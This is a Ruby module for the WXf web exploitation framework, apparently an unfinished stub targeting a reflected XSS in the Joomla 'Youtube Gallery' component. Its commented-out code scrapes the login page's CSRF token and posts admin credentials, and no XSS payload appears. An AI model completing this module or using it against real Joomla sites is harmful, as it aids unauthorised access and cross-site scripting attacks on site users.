class WebXploit < WXf::WXfmod_Factory::Exploit
  include WXf::WXfassists::General::MechReq

def initialize
  super(
   'Name'        => 'Youtube Gallery v2.2.7 Reflected XSS',
   'Version'     => '1.0',
   'Description' => %q{
 	Reflected XSS attack on Joomla Component, Youtube Gallery.
                    },
   'Author'      => [ 'John M. Poulin' ],
   'License'     => WXF_LICENSE
  )

  init_opts([
  	OptString.new('USER', [false, "Joomla Username", ""]),
	OptString.new('PASS', [false, "Joomla Password", ""]),
	OptString.new('COMPONENT', [false, "Component Name", "com_youtubegallery"]),
	OptString.new('ID', [false, "Gallery ID", ""]),
  ])

end

def exploit
	# Prepare and send initial request
	url = rurl + "/administrator/index.php"
=begin
	puts url
	res = send_request_cgi({
                    'method'=> 'GET',
                    'RURL'  => url,
    	})

	# Look for cookie in body
	c_return = res.body.scan(/<input type\=\"hidden\" name\=\"return\" value=\"(.*)\" \/\>\n/m)
	c_hash = res.body.scan(/<input type\=\"hidden\" name\=\"([a-f0-9]{32})\" value=\"1\" \/\>/m)

	puts "Return: #{c_return}"
	puts "Hash: #{c_hash}"

	# Login Params
	params = "username=" + datahash['USER'] + "&passwd=" + datahash['PASS']
	params += "&option=com_login&task=login&return=#{c_return}&#{c_hash}=1"

	# Send Login Request
	res2 = mech_req({
            'method' => "POST",
            'RURL'=> url,
            'RPARAMS' => params,
	    'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
          })
	puts res2.body

puts res2.code
=end
agent = Mechanize.new
puts agent.inspect
end

end

